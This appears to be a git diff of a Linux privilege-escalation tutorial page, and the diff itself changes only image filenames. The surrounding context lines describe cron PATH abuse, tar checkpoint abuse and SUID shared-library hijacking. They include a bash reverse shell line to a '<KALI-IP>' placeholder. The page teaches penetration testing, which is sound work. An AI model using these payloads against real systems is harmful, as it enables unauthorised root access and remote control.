@@ -118,7 +118,7 @@ cat /etc/cron.deny*
 
 This thechnique involves identifying the default `$PATH` variable that's been configured for cron jobs in the `crontab` file, generating a payload, and placing it in the path.
 
-<figure><img src="../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
@@ -132,7 +132,7 @@ echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
 
 Using the example above: `cat /usr/local/bin/compress.sh`&#x20;
 
-<figure><img src="../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 tar utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed.
 
@@ -198,7 +198,7 @@ We can  streamline this process by utilizing a resource called GTFOBins
 
 linPEAS runs each SUID binary with `strace` (Linux utility that is used to monitor and debug applications and processes and their interaction with the Linux kernel) to identify the shared objects that are used by the binary and lists their respective locations.
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
 We can identify the suid-so binary as a potential target as it utilizes several shared objects that do not exist on the target system. However, one specific shared object file should have caught your attention: the suid-so binary utilizes a shared object named libcalc.so that is stored in the user account's home directory.
 
@@ -206,7 +206,7 @@ We can identify the suid-so binary as a potential target as it utilizes several 
 
 Given that we are currently logged on to the target system as the user account, we should be able to modify the shared library that is being utilized by the SUID binary to execute arbitrary commands. In our case, this will provide us with an elevated session when the suid-so binary is executed. This attack works quite similarly to the Windows DLL injection technique, where we replaced the target DLL with a modified one that provided us with an elevated reverse shell when the target service was executed. Before we begin the exploitation phase, we should analyze what the suid-so binary does by executing it, given that the binary is stored in the /usr/local/bin directory. We can execute it directly by running the following command: `suid-so`
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Alternatively, we can analyze what shared objects the binary uses manually with the strace utility as opposed to using automated tools. This can be done by running the following command:
 
@@ -224,7 +224,7 @@ We can also search for useful strings in the binary by using the built-in string
 strings /usr/local/bin/suid-so
 ```
 
-![](<../.gitbook/assets/image (2) (3).png>)
+![](<../.gitbook/assets/image (2).png>)
 
 In this case, we can determine that the application utilizes the libcalc.so shared object in the user account's home directory. The strings utility can prove to be very useful if you do not have access to the strace utility or any automated enumeration scripts such as linPEAS.
 
